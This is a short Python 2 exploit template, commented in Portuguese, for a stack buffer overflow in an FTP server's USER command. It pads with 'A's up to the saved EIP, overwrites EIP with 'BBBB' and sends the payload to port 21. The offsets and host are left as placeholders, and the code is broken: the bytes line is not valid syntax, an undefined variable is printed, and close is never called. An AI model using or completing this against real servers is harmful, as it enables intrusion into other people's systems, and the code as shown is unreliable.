#!/usr/bin/python
import socket

bytes = "A" * valor pra chegar no eip + "BBBB" + "C" * (valor maximo-valor pra chegar no eip e eip)

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("host",21))
	s.recv(1024)
	s.send("USER "+bytes+"\r\n")
	print r
	s.recv(1024)
	s.close
except:
	print "Erro ao conectar"
